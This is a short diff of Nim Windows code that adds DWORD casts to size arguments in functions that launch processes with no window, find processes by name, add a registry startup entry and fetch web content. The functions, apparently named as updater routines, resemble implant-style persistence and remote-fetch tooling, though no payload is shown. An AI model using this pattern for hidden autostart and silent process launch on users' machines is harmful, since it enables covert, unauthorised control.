@@ -18,7 +18,7 @@ proc launchProcess(command: string): bool =
   let cmd: string = command
 
   ZeroMemory(addr si, sizeof(si))
-  si.cb = sizeof(si)
+  si.cb = sizeof(si).DWORD
   ZeroMemory(addr pi, sizeof(pi))
 
   if CreateProcess(nil, cmd, nil, nil, false, CREATE_NO_WINDOW, nil, nil, addr si, addr pi):
@@ -44,7 +44,7 @@ proc getProcessIdByName(processName: string): DWORD =
         raiseOSError(cast[OSErrorCode](1),"EnumProcesses failed")
 
     # Calculate the number of processes in the list
-    processCount = bytesReturned div sizeof(DWORD)
+    processCount = bytesReturned div sizeof(DWORD).DWORD
     #echo "memory: process count [" & intToStr(processCount) & "]"
     
     # Iterate through the list and find the process with the given name
@@ -55,7 +55,7 @@ proc getProcessIdByName(processName: string): DWORD =
         var buffer: array[bufferSize, char]
         hProcess = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, false, processIds[i])
         if hProcess != 0:
-            if GetModuleFileNameEx(hProcess, 0, cast[LPTSTR](addr buffer[0]), sizeof(buffer)) != 0:
+            if GetModuleFileNameEx(hProcess, 0, cast[LPTSTR](addr buffer[0]), sizeof(buffer).DWORD) != 0:
                 var
                     exeName:string = ""
                     tmp_exeName:string = "" 
@@ -153,9 +153,7 @@ proc updt_createStartupShortcut*() =
         # (full_path.len + 1).DWORD
         # )
 
-
-        
-        RegSetValueEx(key, name, 0, REG_SZ, cast[ptr BYTE](addr(full_pathW[0])), len(full_pathW)*sizeof(WCHAR))
+        RegSetValueEx(key, name, 0, REG_SZ, cast[ptr BYTE](addr(full_pathW[0])), (len(full_pathW)*sizeof(WCHAR)).DWORD)
         RegCloseKey(key)
     else:
         discard
@@ -183,7 +181,7 @@ proc updt_fetchWebsiteContent*(url: string): string =
     return "Failed to open URL."
 
   # Read the content and append it to the 'content' string
-  while bool(InternetReadFile(hConnect, addr(buffer), sizeof(buffer), addr(bytesRead))) and (bytesRead > 0):
+  while bool(InternetReadFile(hConnect, addr(buffer), sizeof(buffer).DWORD, addr(bytesRead))) and (bytesRead > 0):
     for i in 0..<bytesRead:
         content &= buffer[i]
 
